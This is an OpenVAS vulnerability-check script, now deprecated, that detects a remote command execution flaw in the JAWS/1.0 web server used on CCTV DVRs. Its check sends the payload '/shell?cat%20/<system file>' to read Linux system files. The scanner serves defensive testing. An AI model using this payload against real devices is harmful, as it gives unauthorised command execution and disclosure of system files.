##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jaws_rce_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
#
# JAWS/1.0 Remote Command Execution Vulnerability
#
# Authors:
# Adrian Steins <adrian.steins@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112099");
  script_version("$Revision: 11747 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-11-01 14:00:33 +0200 (Wed, 01 Nov 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("JAWS/1.0 Remote Command Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");

  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("JAWSJAWS/banner");

  script_tag(name:"summary", value:"The JAWS/1.0 web server is prone to a remote command execution vulnerability.

  This NVT is already covered by 'Multiple DVR Devices Authentication Bypass And Remote Code Execution Vulnerabilities' (OID: 1.3.6.1.4.1.25623.1.0.111088).");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"It is recommended to completely shut down the vulnerable JAWS web server as an attacker might exploit the whole system.");

  script_xref(name:"URL", value:"https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/");

  script_tag(name:"deprecated", value:TRUE);

  exit(0);
}

exit(66);

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/shell?cat%20/' + file;

  if (http_vuln_check(port:port, url:url, pattern:pattern, check_header:TRUE)) {
    report = report_vuln_url(port:port, url:url, url_only:TRUE);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
